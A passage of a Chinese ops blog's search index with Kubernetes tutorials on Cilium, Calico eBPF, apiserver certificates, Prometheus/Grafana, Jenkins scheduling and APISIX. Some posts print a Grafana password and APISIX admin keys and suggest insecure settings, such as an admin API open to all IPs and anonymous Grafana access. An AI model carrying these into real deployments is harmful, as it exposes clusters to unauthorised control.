下的多集群应用","uri":"https://www.chenshaowen.com/blog/multi-cluster-applications-under-kubevela.html"},{"content":"1. 系统要求 Kubernetes， \u0026gt;= 1.16.0-0 Helm， \u0026gt;= 3.0 Linux 内核 \u0026gt;= 4.9.17 CentOS 7 升级内核过程，可以参考 Calico 下如何切换数据面到 eBPF 。\n2. 卸载 Calico 删除集群资源 1 2 3 4 5 6 kubectl -n kube-system delete ds calico-node kubectl -n kube-system delete deploy calico-kube-controllers kubectl -n kube-system delete sa calico-node kubectl -n kube-system delete sa calico-kube-controllers kubectl -n kube-system delete cm calico-config kubectl -n kube-system delete secret calico-config 1 kubectl get crd | grep calico | awk \u0026#39;{print $1}\u0026#39; | xargs kubectl delete crd 关闭 Tunl0 网卡 1 ifconfig tunl0 down 移除 Calico 配置文件 1 rm -rf /etc/cni/net.d/* 3. 安装 Cilium 安装 Cilium 和 Hubble 1 2 3 4 5 helm repo add cilium https://helm.cilium.io/ helm install cilium cilium/cilium --version 1.10.4 \\ --namespace kube-system\\ --set hubble.relay.enabled=true \\ --set hubble.ui.enabled=true 将 Hubble UI 改为 NodePort 访问 1 kubectl -n kube-system patch svc hubble-ui -p \u0026#39;{\u0026#34;spec\u0026#34;: {\u0026#34;type\u0026#34;: \u0026#34;NodePort\u0026#34;}}\u0026#39; 查看 Hubble UI 的访问端口: 1 2 3 4 kubectl -n kube-system get svc hubble-ui NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE hubble-ui NodePort 10.106.132.71 \u0026lt;none\u0026gt; 80:32572/TCP 11m 4. 访问 Hubble 查看网络连接 访问主机 IP:32572 ，即可查看到可视化的拓扑网络。\n5. 参考 https://docs.cilium.io/en/stable/gettingstarted/k8s-install-default/ ","description":"","id":201,"section":"post","tags":["博文","Cilium","Calico","Kubernetes","容器","网络"],"title":"使用 Cilium 替换 Calico","uri":"https://www.chenshaowen.com/blog/how-to-use-cilium-to-replace-calico.html"},{"content":"1. 环境准备 1.1 Calico eBPF 要求 系统要求\nUbuntu 18.04.4+ Red Hat v8.2 Linux kernel v5.3+ 如果 Calico 没有检测到兼容的内核，将会回退到标准模式。\n每个节点的 /sys/fs/bpf 都需要挂载有 BPF 文件系统\nCalico 版本不低于 3.13\n1.2 升级内核 这里使用的是 CentOS 7 操作系统：\n1 2 3 uname -rv 3.10.0-957.el7.x86_64 #1 SMP Thu Nov 8 23:39:32 UTC 2018 内核版本不满足要求，因此需要升级内核。内核小版本更新很快，可以去 http://ftp.sjtu.edu.cn/sites/elrepo.org/linux/kernel/el7/x86_64/RPMS/ 自行查找。\n1 2 3 4 5 6 7 wget https://mirrors.nju.edu.cn/elrepo/kernel/el7/x86_64/RPMS/kernel-lt-5.4.146-1.el7.elrepo.x86_64.rpm rpm -ivh kernel-lt-5.4.146-1.el7.elrepo.x86_64.rpm cat /boot/grub2/grub.cfg | grep menuentry grub2-set-default \u0026#39;CentOS Linux (5.4.146-1.el7.elrepo.x86_64) 7 (Core)\u0026#39; grub2-editenv list grub2-mkconfig -o /boot/grub2/grub.cfg reboot 1.3 检查 BPF 文件系统 检查文件挂载:\n1 2 3 mount | grep \u0026#34;/sys/fs/bpf\u0026#34; none on /sys/fs/bpf type bpf (rw,relatime) 如果上面的结果为空，则需要挂载 BPF 文件系统，执行命令:\n1 mount bpffs -t bpf /sys/fs/bpf 1.4 查看 Calico 版本 执行命令:\n1 2 3 kubectl -n kube-system get deploy calico-kube-controllers -o yaml |grep image image: calico/kube-controllers:v3.16.3 查看 Calico 版本不低于 3.13 即可。\n2. 切换 Calico 数据面到 eBPF 2.1 关闭 kube-proxy 1 2 3 kubectl patch ds -n kube-system kube-proxy -p \u0026#39;{\u0026#34;spec\u0026#34;:{\u0026#34;template\u0026#34;:{\u0026#34;spec\u0026#34;:{\u0026#34;nodeSelector\u0026#34;:{\u0026#34;non-calico\u0026#34;: \u0026#34;true\u0026#34;}}}}}\u0026#39; daemonset.apps/kube-proxy patched 2.2 开启 eBPF 模式 calicoctl 是 Calico 提供的一个 CLI 工具。\n1 2 3 calicoctl patch felixconfiguration default --patch=\u0026#39;{\u0026#34;spec\u0026#34;: {\u0026#34;bpfKubeProxyIptablesCleanupEnabled\u0026#34;: false}}\u0026#39; calicoctl patch felixconfiguration default --patch=\u0026#39;{\u0026#34;spec\u0026#34;: {\u0026#34;bpfEnabled\u0026#34;: true}}\u0026#39; calicoctl patch felixconfiguration default --patch=\u0026#39;{\u0026#34;spec\u0026#34;: {\u0026#34;bpfExternalServiceMode\u0026#34;: \u0026#34;DSR\u0026#34;}}\u0026#39; 3. 参考 https://ebpf.io/ https://docs.projectcalico.org/maintenance/enabling-bpf https://docs.projectcalico.org/getting-started/clis/calicoctl/install ","description":"","id":202,"section":"post","tags":["博文","网络","Calico","eBPF","Kubernetes"],"title":"Calico 下如何切换数据面到 eBPF","uri":"https://www.chenshaowen.com/blog/how-to-switch-data-plane-to-ebpf.html"},{"content":"1. Calico 1.1 BIRD is not ready 1 kubectl -n kube-system get pod calico-node-xxx 0/1 一直起不来，报错 calico/node is not ready: BIRD is not ready: BGP not established with\n解决办法:\nCalico 默认使用 first-found，也就是从第一个找到的网卡中获取 NodeIP。虽然排除了 lo、docker0 等网卡，但是依然有一定概率会识别失败。需要手动修改，指定网卡。\n查看主机上的网卡 1 2 3 4 5 6 7 8 9 10 11 12 13 14 ip addr 1: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever 2: ens160: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc mq state UP group default qlen 1000 link/ether 00:50:56:92:3a:20 brd ff:ff:ff:ff:ff:ff inet 10.13.5.65/23 brd 10.13.5.255 scope global ens160 valid_lft forever preferred_lft forever inet6 fe80::250:56ff:fe92:3a20/64 scope link valid_lft forever preferred_lft forever 编辑 Calico 部署文件 1 kubectl -n kube-system edit ds calico-node 指定 IP_AUTODETECTION_METHOD 中的 interface 为网卡名即可，支持通配符。\n1 2 3 4 5 6 spec: containers: - env: - name: IP_AUTODETECTION_METHOD value: interface=ens160 image: docker.io/calico/node:v3.18.2 2. Metric Server 2.1 无法访问 Metric Server 无法访问 Metric Server 服务\n解决办法:\nkubectl -n kube-system edit deploy metrics-server 修改启动参数:\n1 2 - --kubelet-insecure-tls - --kubelet-preferred-address-types=InternalIP 跳过证书验证、使用 Node 节点的 IP 进行通信。\n3. NFS Storage 3.1 selfLink was empty 在 NFS 的 Pod 中会看到类似错误日志\n1 2 I0916 06:12:44.587396 1 leaderelection.go:185] attempting to acquire leader lease default/cluster.local-nfs-client-nfs-client-provisioner... E0916 06:12:44.597222 1 event.go:259] Could not construct reference to: \u0026#39;\u0026amp;v1.Endpoints{TypeMeta:v1.TypeMeta{Kind:\u0026#34;\u0026#34;, APIVersion:\u0026#34;\u0026#34;}, ObjectMeta:v1.ObjectMeta{Name:\u0026#34;cluster.local-nfs-client-nfs-client-provisioner\u0026#34;, GenerateName:\u0026#34;\u0026#34;, Namespace:\u0026#34;default\u0026#34;, SelfLink:\u0026#34;\u0026#34;, UID:\u0026#34;bd270086-5338-464b-b50d-b3ec110fc6d1\u0026#34;, ResourceVersion:\u0026#34;4413847\u0026#34;, Generation:0, CreationTimestamp:v1.Time{Time:time.Time{wall:0x0, ext:63767369564, loc:(*time.Location)(0x1956800)}}, DeletionTimestamp:(*v1.Time)(nil), DeletionGracePeriodSeconds:(*int64)(nil), Labels:map[string]string(nil), Annotations:map[string]string{\u0026#34;control-plane.alpha.kubernetes.io/leader\u0026#34;:\u0026#34;{\\\u0026#34;holderIdentity\\\u0026#34;:\\\u0026#34;nfs-client-nfs-client-provisioner-5d4fd84f8b-pnwkv_1b60c33d-16b5-11ec-9098-dae3d1cb24d6\\\u0026#34;,\\\u0026#34;leaseDurationSeconds\\\u0026#34;:15,\\\u0026#34;acquireTime\\\u0026#34;:\\\u0026#34;2021-09-16T06:12:44Z\\\u0026#34;,\\\u0026#34;renewTime\\\u0026#34;:\\\u0026#34;2021-09-16T06:12:44Z\\\u0026#34;,\\\u0026#34;leaderTransitions\\\u0026#34;:0}\u0026#34;}, OwnerReferences:[]v1.OwnerReference(nil), Initializers:(*v1.Initializers)(nil), Finalizers:[]string(nil), ClusterName:\u0026#34;\u0026#34;}, Subsets:[]v1.EndpointSubset(nil)}\u0026#39; due to: \u0026#39;selfLink was empty, can\u0026#39;t make reference\u0026#39;. Will not report event: \u0026#39;Normal\u0026#39; \u0026#39;LeaderElection\u0026#39; \u0026#39;nfs-client-nfs-client-provisioner-5d4fd84f8b-pnwkv_1b60c33d-16b5-11ec-9098-dae3d1cb24d6 became leader\u0026#39; 解决办法:\nKubernetes 1.20 开始, 默认删除了 metadata.selfLink 字段。但是 nfs-client-provisioner 依然使用了该字段。因此, 需要在 kube-apiserver 中开启。\n编辑 /etc/kubernetes/manifests/kube-apiserver.yaml , 在启动参数中添加一行 - --feature-gates=RemoveSelfLink=false 即可。\n","description":"","id":203,"section":"post","tags":["整理","Kubernetes"],"title":"Kubernetes 安装问题 QA","uri":"https://www.chenshaowen.com/blog/the-question-and-answer-of-kubernetes-installation.html"},{"content":" nload 是一个流量监控的终端工具，读取 /proc/net/dev 文件，绘制流量图。下面是一个简单的使用简介。\n1. 安装 CentOS 1 yum install -y nload 如果系统的源找不到 nload 包，可以执行如下命令添加新源:\n1 yum install -y https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm Ubuntu 1 apt-get install -y nload 2. 参数 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 nload --help Command line syntax: nload [options] [devices] nload --help|-h Options: -a period 设置用于计算平均数的时间窗口的长度，默认值 30 秒 -i max_scaling 进入流量图显示的最大比例，默认值 10240 -m 显示多个设备，但是没有流量图。 -o max_scaling 出去流量图显示的最大比例，默认值 10240 -t interval 数据刷新的时间间隔，默认是 500 毫秒 -u h|b|k|m|g 设置流量的单位 H|B|K|M|G h: auto, b: Bit/s, k: kBit/s, m: MBit/s etc. H: auto, B: Byte/s, K: kByte/s, M: MByte/s etc. Default is h. -U h|b|k|m|g 和 u 参数一样，但是显示的是总量 (没有 \u0026#34;/s\u0026#34;). H|B|K|M|G Default is H. devices 检测的网络设备，默认检测全部设备 示例: nload -t 200 -i 1024 -o 128 -U M 3. 使用 1 nload 指定网卡\n1 nload ens192 ","description":"","id":204,"section":"post","tags":["整理","Linux","工具","nload"],"title":"Linux 网络流量监控终端工具 - nload","uri":"https://www.chenshaowen.com/blog/the-nload-is-a-the-terminal-tool-of-linux-network-traffic-monitor.html"},{"content":"1. 本地怎么访问远程集群 在研发时，需要直接连接远端 Kubernetes 集群。通常的做法是，将 /etc/kubernetes/admin.conf 拷贝到本地 ~/.kube/kubeconfig。\n但是 kubeconfig 的 server 地址是 kubernetes.default.svc。因此，我们需要配置一个 hosts:\n1 1.1.1.1 kubernetes.default.svc 如果需要在不同集群之间切换，不仅需要更换 kubeconfig，还需要修改 hosts。下面介绍一种方法，可以直接将远程访问地址，添加到集群的证书中，节省修改 hosts 的步骤，同时还能让人更容易区分不同集群。\n2. 查看 Apiserver 证书包含哪些地址 进入证书目录 1 cd /etc/kubernetes/pki 查看证书 1 2 3 4 openssl x509 -in apiserver.crt -noout -text X509v3 Subject Alternative Name: DNS:1-1-1-1, DNS:kubernetes, DNS:kubernetes.default, DNS:kubernetes.default.svc, DNS:kubernetes.default.svc.cluster.local, DNS:lb-apiserver.kubernetes.local, DNS:localhost, IP Address:1.1.1.1 这里如果只允许通过 1.1.1.1 访问集群的 Apiserver。如果需要使用域名，kubernetes、kubernetes.default、kubernetes.default.svc 等，则需要配置 hosts 将其指向 1.1.1.1 。\n3. 添加新的域名或 IP 到证书 备份证书 1 2 3 cd /etc/kubernetes/pki mv apiserver.crt apiserver.crt.bak mv apiserver.key apiserver.key.bak 修改 kubeadm-config.yaml kubeadm-config.yaml 可能在 /etc/kubernetes/kubeadm-config.yaml，也有可能在 /root/kubeadm-config.yaml，具体位置与安装方式、安装工具有关。\n在 ClusterConfiguration 的 apiServer 字段下，找到 certSANs。\n1 2 3 4 5 6 7 8 9 apiVersion: kubeadm.k8s.io/v1beta2 kind: ClusterConfiguration ... certSANs: - kubernetes - kubernetes.default - kubernetes.default.svc - kubernetes.default.svc.cluster.local - 10.233.0.1 在 certSANs 中添加远程访问的域名或 IP 地址：\n1 2 3 4 5 6 7 certSANs: - remote.domain.com - kubernetes - kubernetes.default - kubernetes.default.svc - kubernetes.default.svc.cluster.local - 10.233.0.1 重新生成证书 1 kubeadm init phase certs apiserver --config /root/kubeadm-config.yaml 执行之后，立即生效。如果有多个 Master，那么需要依次更新全部证书。\n4. 参考 https://kubesphereio.com/post/add-public-ip-to-kubernetes-apiserver-operation-guide/ ","description":"","id":205,"section":"post","tags":["博文","Kubernetes","研发","证书"],"title":"如何给 Kubernetes Apiserver 新增访问入口","uri":"https://www.chenshaowen.com/blog/how-to-add-entrance-to-kubernetes-apiserver.html"},{"content":" Prometheus 社区更新太快，之前写的一些文档有些过时。最近又开始关注可观测性，补齐运维方面的一些知识点。\n1. 名词解释 Grafana 一个可视化工具，提供各种可视化面板，支持各种数据源，包括 Prometheus、OpenTSDB、MySQL 等。\nPrometheus 一个时间序列数据库，主要用于收集、存储、对外提供查询数据。\nExporter 一个用来暴露服务监控指标的程序，提供 API 接口给 Prometheus 拉取监控数据。\nPromQL Prometheus 内置的数据查询语言，其提供对时间序列数据丰富的查询，聚合以及逻辑运算能力的支持。\n2. 安装 Prometheus 添加 Helm 源 1 2 helm repo add prometheus-community https://prometheus-community.github.io/helm-charts helm repo update 安装 Prometheus 1 helm install prometheus -n monitor prometheus-community/prometheus --create-namespace --version 19.0.0 如果 prometheus-node-exporter 一直起不来，可能是默认端口 9100 被占用。可以使用下面的命令，编辑 DaemonSet 修改默认端口:\n1 kubectl -n monitor edit ds prometheus-node-exporter 卸载 1 helm uninstall prometheus -n monitor 3. 安装 Grafana 添加 Helm 源 1 2 helm repo add grafana https://grafana.github.io/helm-charts helm repo update 1 helm -n monitor install grafana grafana/grafana 值得注意的是，这种安装方法，Grafana 的数据存储在 Pod 的 /var/lib/grafana 路径下，如果重启 Grafana ，相关的配置会丢失。如果是生产环境，需要挂载存储卷。如果有 StorageClass 可用，可以使用如下参数进行持久化存储:\n1 helm -n monitor install grafana grafana/grafana --set persistence.enabled=\u0026#34;true\u0026#34; --version 6.29.9 获取 admin 账户的登录密码 1 2 3 kubectl -n monitor get secret grafana -o jsonpath=\u0026#34;{.data.admin-password}\u0026#34; | base64 --decode ; echo JIsmMsWaN8rF5ryS7rVohHyFWKzyahR7u0OJsiJL 修改 Grafana 服务的访问方式为 NodePort 1 kubectl -n monitor patch svc grafana -p \u0026#39;{\u0026#34;spec\u0026#34;: {\u0026#34;type\u0026#34;: \u0026#34;NodePort\u0026#34;}}\u0026#39; 1 2 3 4 kubectl -n monitor get svc grafana NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE grafana NodePort 10.233.6.118 \u0026lt;none\u0026gt; 80:31892/TCP 117s 这用，通过主机 IP + 31892 即可访问 Grafana。\n卸载 1 helm -n monitor uninstall grafana 4. 配置使用 4.1 添加数据源 在左侧导航栏，找到 [Data Sources]\n填入 Prometheus 的访问地址 http://prometheus-server.monitor.svc 即可。\n4.2 添加模板 在左侧导航栏 [+]中找到 Import 按钮，我选择的是 id 为 10856 的面板导入。也可以去 Grafana 官网，选择合适的面板导入，https://grafana.com/grafana/dashboards。\n如下图，这里需要选择上面添加的数据源。\n4.3 查看看板 4.4 grafana.ini 配置 Grafana 有些配置需要通过修改 grafana.ini 实现，下面仅列举我用到的几个:\n编辑配置文件 1 kubectl -n monitor edit cm grafana 添加配置 允许匿名访问 1 2 3 grafana.ini: | [auth.anonymous] enabled = true 允许 Iframe 嵌入 1 2 3 grafana.ini: | [security] allow_embedding = true 重启 Grafana 生效 1 kubectl -n monitor rollout restart deployment grafana 5. 参考 https://artifacthub.io/packages/helm/prometheus-community/kube-prometheus-stack ","description":"","id":206,"section":"post","tags":["博文","数据","前端","分析"],"title":"Prometheus、Grafana 搭建 Kubernetes 监控","uri":"https://www.chenshaowen.com/blog/the-monitor-of-kubernetes-using-prometheus-grafana.html"},{"content":"1. 问题背景 在 Jenkins 中添加了很多个构建节点使用同一个 Label 以供流水线使用，但是 Jenkins 却每次都倾向于在同一个节点进行构建。\n这导致了并发问题，单个节点的压力过大，而其他节点空闲，负载极其不均衡。\n2. 业务流水线的设计 上述问题的产生和业务流水线的设计有一定的关系。\n目前的业务流水线设计如下:\n如上图，全部业务共用一条流水线，通过传递不同的参数，生成不同的 job 执行各个业务的流水线逻辑。\n这样做的好处是流水线数量极少，设计简单，方便维护。但构建日志非常集中，单个流水线，具有上万的构建历史，在查询和分页时，会对 IO 产生很大压力。\n在 Jenkins 的调度策略中，默认每隔 10 秒就会产生一个 Slave 节点的快照，使用移动平均算法（EMA，一种可以抹平峰值的算法）计算需要的 Executor 数量，当数量不足时，会使用 NodeProvisioner 启动新的 Agent。在 Agent 资源充足时，Jenkins 不会启动更多 Agent 。但 Jenkins 对可用的 Agent 调度并不均衡，有的节点往往堆积很多，有的节点又很空闲。同一个流水线产生的 Job 倾向于使用同一个 Agent 进行构建。\nJenkins 的这种调度策略，不利于有效分担 CI 的构建压力。最终，业务侧的表现就是，流水线非常的卡顿，失败率随着构建次数、业务量的增加而增长。\n3. 如何优化单流水线多业务的设计 3.1 采用多流水线多业务的设计 如上图，每个业务创建一条流水线，在构建数量相同的情况下。原来的 1 条流水线 10000 条构建历史，改进为 100 条流水线，每条流水线 100 条构建记录。\n这在查询性能上，会带来显著提升。同时，给调度策略提供了更大灵活性。可以给部分流水线指定特定的构建节点，保障高优先级的业务具有更高的可用性。\n3.2 添加更多的构建机、减少单个节点的并发数量 通常，为了更充分的利用构建机资源，我们会将节点的并发数量设置得很高，比如 50、100。由于 Jenkins 的调度策略，在单流水线多业务的设计下，Job 会集中到某一个节点，造成压力。\n因此，我们可以增加构建机的数量，而减少单个节点的并发数量。\n之前是单个节点并发最大 50，现在可以降低配置，使用 3 台低配的构建机，使用相同的标签，并发设置为 20。\n这种方式是在物理上对构建环境进行了隔离，提高整个流水线系统的可用性。\n3.3 使用 Throttle Concurrent Builds 插件控制并发 插件离线下载地址: https://archives.jenkins-ci.org/plugins/throttle-concurrents/ ，直接上传不用重启即可生效。\nThrottle Concurrent Builds 插件主要用来对并发构建数量和策略进行控制。\n在 Jenkins 的配置页面，可以设置最大总的构建数量、每个节点最大构建数量。\n在每条流水线中，可以设置指定时间间隔内的构建数量。\n这种方式主要是通过限流的方式，保证服务的可用性，避免业务量超过系统设计值时，导致流水线不可用。但缺陷也很明显，就是业务量大时大量流水线处于等待状态。\n3.4 将节点选择也作为流水线参数 在上面的模型中，多个业务公用了一条流水线，而流水线对节点的选择使用的是同一个标签，也就是将调度完全交给了 Jenkins。这是导致上述问题的根源之一。\n因此，我们可以在业务系统中，维护一个可用的标签列表，每次创建 Job 时，随机提供一个有效的标签，控制 Job 选择指定的节点进行构建。\n这种方式是通过业务系统的控制，指定构建机来控制 Job 在构建机上的均衡分布。\n3.5 使用 Kubernetes 提供构建环境 利用 Kubernetes 提供的弹性，在 Kubernetes 上动态创建 Jenkins Slave，可以具有很高的并发量，可以参考在 Kubernetes 上动态创建 Jenkins Slave、Kubernetes 动态创建 Jenkins Agent 压力测试。\n4. 总结 本文主要针对流水线遇到的调度和并发问题，进行了分析并给出了几种解决方案。其中建议:\n使用多业务多流水线的模型 添加更多的构建机分散构建 设置构建机能承受的并发值 是我认为比较重要的优化点。\n5. 参考 https://plugins.jenkins.io/throttle-concurrents/ https://archives.jenkins-ci.org/plugins/throttle-concurrents/latest/ https://nagle.top/2020/11/02/Jenkins-Queue-Arch.html https://www.cnblogs.com/guguli/p/7827435.html ","description":"","id":207,"section":"post","tags":["博文","Jenkins","CICD","DevOps"],"title":"Jenkins为什么一直调度到同一个节点","uri":"https://www.chenshaowen.com/blog/why-does-jenkins-agent-like-going-to-the-same-node.html"},{"content":"1. 几种常见网关的比较 Nginx, 模块化设计的反向代理软件，C 语言开发 OpenResty, 以 Nginx 为核心的 Web 开发平台，可以解析执行 Lua 脚本 Kong, OpenResty 的一个应用，是一个 API 网关，具有 API 管理和请求代理的功能，使用 PostgreSQL 存储 APISIX, 替换了 Kong 的 PostgreSQL 为 Etcd，基于 Nginx 的核心库实现 APISIX 的优势在于提供了 API 的管理和扩展能力，让网关不再仅仅转发服务，而是可以被配置、定制化。相较于 Nginx，APISIX 使用的是动态路由，避免了配置之后 reload 产生的风险。同时，APISIX 支持 HTTP(S)、HTTP2、Dubbo、QUIC、MQTT、TCP/UDP 等更多的协议，具有更好的使用生态。\n上面是 APISIX 的架构图，数据面处理客户端请求，控制面管理路由。\n2. APISIX 能解决什么问题 边缘路由 机房对外暴露的访问入口 IP 数量，通常是极少的，但是却支撑了很多个服务。比如，访问的 IP 是 1.2.3.4，但却同时提供了 a.domain.com、b.domain.com 的访问服务。这就需要用到边缘路由，边缘路由会将不同域名的访问，转发到不同的内网地址。\nAPISIX 中三种方式可以注册边缘路由，dashboard、ingress-controller、admin api。\n基础网关能力 网关的功能不限于转发流量，更重要的是限流、熔断等。\nAPISIX 内置了很多插件，提供 APM、日志、熔断、鉴权、证书管理、故障注入等功能。同时，也支持拖拽组合新的插件、开发新插件以满足业务需求。\nServerless APISIX 通过插件的方式提供 Serverless，目前仅支持 Lua。但 APIGateway + Serverless 的组合，极具想象力。\n利用 Serverless 可以快速对外提供无服务的 API，粘合各种服务，也可以对外直接提供功能服务。\n灰度发布 由于对网关层进行了控制，APISIX 允许用户通过配置权重控制流量的转发行为，可以用来做灰度发布使用。\n3. Kubernetes 上安装 APISIX 3.1 添加 Helm 源 添加 Helm 源 1 2 helm repo add apisix https://charts.apiseven.com helm repo update 查找 Chart 包 1 2 3 4 5 6 helm search repo apisix NAME CHART VERSION\tAPP VERSION\tDESCRIPTION apisix/apisix 0.3.5 2.7.0 A Helm chart for Apache APISIX apisix/apisix-dashboard 0.1.5 2.7.0 A Helm chart for Apache APISIX Dashboard apisix/apisix-ingress-controller\t0.5.0 1.0.0 Apache APISIX Ingress Controller for Kubernetes 3.2 安装 APISIX 安装 APISIX 1 helm install apisix apisix/apisix --set gateway.type=NodePort --set admin.allow.ipList=\u0026#34;{0.0.0.0/0}\u0026#34; -n apisix --create-namespace 查看入口地址 1 2 3 4 5 export NODE_PORT=$(kubectl get --namespace apisix -o jsonpath=\u0026#34;{.spec.ports[0].nodePort}\u0026#34; services apisix-gateway) export NODE_IP=$(kubectl get nodes --namespace apisix -o jsonpath=\u0026#34;{.items[0].status.addresses[0].address}\u0026#34;) echo http://$NODE_IP:$NODE_PORT http://1.1.1.1:32462 这里的入口地址是后端服务的入口地址，如果是生成环境，应该使用 LoadBalancer 提供的地址。\n查看 apisix-admin 接口 key 1 2 3 4 5 6 7 export POD_NAME=$(kubectl get pods --namespace apisix -l \u0026#34;app.kubernetes.io/instance=apisix,app.kubernetes.io/name=apisix\u0026#34; -o jsonpath=\u0026#34;{.items[0].metadata.name}\u0026#34;) kubectl -n apisix exec -it $POD_NAME cat conf/config.yaml |grep key admin_key: key: edd1c9f034335f136f87ad84b625c8f1 key: 4054f7cf07e344346cd3f287985e76a2 第一个 key 是 admin，第二个 key 是 viewer。这里的 key 可以用来通过 admin api 来配置 APISIX，给其他系统集成 APISIX 提供了入口。\n3.3 安装 Dashboard 安装 Dashboard 1 helm install apisix-dashboard apisix/apisix-dashboard -n apisix --create-namespace 将 Dashboard 设置为 NodePort 访问 1 kubectl patch svc apisix-dashboard -p \u0026#39;{\u0026#34;spec\u0026#34;: {\u0026#34;type\u0026#34;: \u0026#34;NodePort\u0026#34;}}\u0026#39; -n apisix 默认账户是：admin\n默认密码是：admin\n查看 Dashboard 访问入口 1 2 3 4 5 export NODE_PORT=$(kubectl get --namespace apisix -o jsonpath=\u0026#34;{.spec.ports[0].nodePort}\u0026#34; services apisix-dashboard) export NODE_IP=$(kubectl get nodes --namespace apisix -o jsonpath=\u0026#34;{.items[0].status.addresses[0].address}\u0026#34;) echo http://$NODE_IP:$NODE_PORT http://1.1.1.1:31501 3.4 安装 ingress-controller 安装 ingress-controller 1 helm install apisix-ingress-controller apisix/apisix-ingress-controller --set config.apisix.baseURL=http://apisix-admin:9180/apisix/admin --set config.apisix.adminKey=edd1c9f034335f136f87ad84b625c8f1 -n apisix 这里就会需要设置上面获取到的 admin key, 实际上 ingress-controller 也是通过调用 admin api 来配置路由的。\n4. 创建服务测试 前面提到 APISIX 通过 admin api 配置路由，有三种方式可以操作。这里主要验证使用 Dashboard 和 Ingress 两种方式：\n创建一个服务 1 kubectl create deployment web --image=gcr.io/google-samples/hello-app:1.0 暴露服务 1 kubectl expose deployment web --type=NodePort --port=8080 查看服务 1 2 3 4 kubectl get service web NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE web NodePort 10.233.58.113 \u0026lt;none\u0026gt; 8080:30572/TCP 28d 4.1 Dashboard 配置路由 新建一个上游服务 这里需要填入上面创建的集群访问地址：web.default.svc.cluster.local\n新建一个路由 点击下一步之后，选择上面创建的服务 web，相关的参数就会自动填充。\n访问测试 4.2 Ingress 配置路由 创建一个 ApisixRoute 路由 虽然这里部署的是 ingress-controller 组件，但是使用时创建的是 ApisixRoute 对象。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 apiVersion: apisix.apache.org/v1 kind: ApisixRoute metadata: name: web-route spec: http: - name: web match: hosts: - dev4.chenshaowen.com paths: - \u0026#34;/router-web/*\u0026#34; backend: serviceName: web servicePort: 8080 访问测试 查看创建的路由 可以发现路由是被 ingress-controller 接管的，人工不要编辑。\n查看服务 可以看到服务主要是由四个后端提供。\n查看服务 Pod 的 IP 1 2 3 4 5 6 7 kubectl get pod -o wide NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES web-79d88c97d6-2sdlj 1/1 Running 0 27d 10.233.105.34 node4 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; web-79d88c97d6-7bfbb 1/1 Running 0 27d 10.233.105.32 node4 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; web-79d88c97d6-hccqk 1/1 Running 0 27d 10.233.105.33 node4 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; web-79d88c97d6-mh9gz 1/1 Running 0 28d 10.233.105.22 node4 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; APISIX 会将 Pod 的 IP 地址直接作为流量后端，而不需要经过 Service 的转发，这有别于 Kubernetes 的服务转发、负载均衡机制。\n5. 总结 本文主要简述了几种网关的区别，思考了 APISIX 主要能帮助我们解决什么问题，最后在 Kubernetes 上进行了实践。内容如下：\nAPISIX 是基于 Nginx 网络库实现的 API 网关应用，使用 Etcd 作为存储后端 APISIX 能作为边缘路由使用，其动态特性，避免了 Nginx reload 带来的抖动 APISIX 提供了 admin api 管理路由，有三种方式可以进行配置 Kubernetes 下的 APISIX 跳过了 Kubernetes Service 直接将流量转发到 Pod IP 6. 参考 https://github.com/apache/apisix https://bbs.huaweicloud.com/blogs/125686 https://github.com/apache/apisix-ingress-controller/blob/master/docs/en/latest/concepts/apisix_route.md ","description":"","id":208,"section":"post","tags":["博文","Kubernetes","APISIX","微服务"],"title":"Kubernetes 下的网关服务 - APISIX","uri":"https://www.chenshaowen.com/blog/a-gateway-under-kubernetes-named-apisix.html"},{"content":"\n1. Serverless 的使用场景 如果说云计算是希望资源能够像自来水一样，隋开随用、随关随停，那么 Serverless 就是云计算的未来方向之一。相较于 IaaS、Kubernetes 这些运行时，Serverless 提供更细粒度资源控制的同时，还能提供更大的弹性，允许开发者快速交付功能。\n常见的 Serverless 场景有聚合服务、构建轻量服务、海量按需付费，能够覆盖大部分的需求。本文将以腾讯云的 Serverless 服务，构建一个微信公众号的服务后端。\n2. 在腾讯云 Serverless 上创建函数服务 目前腾讯云 Serverless 主要提供两种类型:\n函数服务，提供一些函数执行的服务 Serverless 应用，提供完整应用的运行时 Serverless 应用类型目前并没有提供编译型应用，也没有 Gin 框架，主要是 PHP、Python。但函数服务中，Serverless 提供了一种镜像类型，可以直接运行镜像中的文件。因此，可以提前构建好应用的镜像，再借助函数服务创建应用服务。\n2.1 初始化镜像 创建命名空间 打开链接 https://console.cloud.tencent.com/tke2/registry/user/space , 新建一个命名空间，这里我使用的是 shaowenchen\n创建一个镜像 点击【新建】，创建一个空的镜像，用于创建函数服务。这里需要记住镜像地址，ccr.ccs.tencentyun.com/shaowenchen/xxx 。\n2.2 创建函数服务 打开链接 https://console.cloud.tencent.com/scf/list-create?rid=1\u0026amp;ns=default\u0026amp;createType=empty\n按照上图，依次按照如下步骤操作:\n选择自定义创建 选择 Web 函数 选择镜像部署，点击选择镜像, 选中上一步创建的镜像 完善 Command, 填入镜像中应用服务的启动命令 /app 最后点击 【完成】 创建服务，但是提供的网关地址 https://service-xxx.gz.apigw.tencentcs.com/release/ 并不能打开，因为镜像还是空的。下一步，我们创建项目，推送镜像。\n3. 在 Github 上创建后端项目 3.1 使用 Gin 初始化项目 使用 Gin 创建一个后端项目，下面是 main.go 文件。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 package main 